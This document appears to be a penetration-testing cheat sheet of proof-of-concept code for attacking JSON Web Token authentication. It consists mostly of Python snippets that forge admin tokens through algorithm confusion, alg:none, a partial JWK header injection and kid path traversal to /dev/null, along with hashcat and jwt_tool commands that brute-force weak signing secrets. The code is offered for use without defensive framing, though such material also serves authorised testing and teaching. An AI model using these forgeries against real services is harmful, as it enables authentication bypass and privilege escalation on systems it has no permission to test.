# PoC Skeleton -- JWT Attacks

## Algorithm Confusion (RS256 to HS256)

```python
#!/usr/bin/env python3
"""JWT Algorithm Confusion: RS256 -> HS256"""
import jwt

# Get the server public key
public_key = open("public.pem", "rb").read()

# Sign with public key as HMAC secret
forged_token = jwt.encode(
    {"sub": "admin", "role": "admin", "iat": 1234567890},
    public_key,
    algorithm="HS256"
)
print(f"[+] Forged token: {forged_token}")
```

## alg:none Bypass

```python
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).decode().rstrip('=')

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin"}).encode()
).decode().rstrip('=')

# Token with no signature
token = f"{header}.{payload}."
print(f"[+] alg:none token: {token}")
```

## Weak Secret Brute Force

```bash
# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Using jwt-pwn or jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

## JWK Header Injection

```python
import jwt, json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Generate attacker key pair
private_key = rsa.generate_private_key(65537, 2048, default_backend())

# Create JWK from public key
# Embed in token header as {"jwk": {...}}
# Sign with attacker private key
```

## kid Path Traversal

```python
import jwt

# Sign with empty key (kid points to /dev/null)
token = jwt.encode(
    {"sub": "admin"},
    "",  # empty key
    algorithm="HS256",
    headers={"kid": "../../../../../../dev/null"}
)
print(f"[+] Token with kid traversal: {token}")
```
